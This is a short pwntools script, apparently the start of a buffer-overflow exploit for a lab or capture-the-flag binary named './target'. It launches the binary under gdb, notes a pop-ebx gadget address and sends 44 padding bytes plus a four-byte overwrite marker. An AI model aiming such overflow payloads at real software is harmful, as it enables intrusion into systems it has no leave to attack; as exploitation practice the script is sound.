from pwn import *
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']

pop_ebx = 0x0804901e

p = gdb.debug('./target')

payload = ''
payload += 'A' * 44
payload += 'B' * 4

p.sendline(payload)
p.interactive()


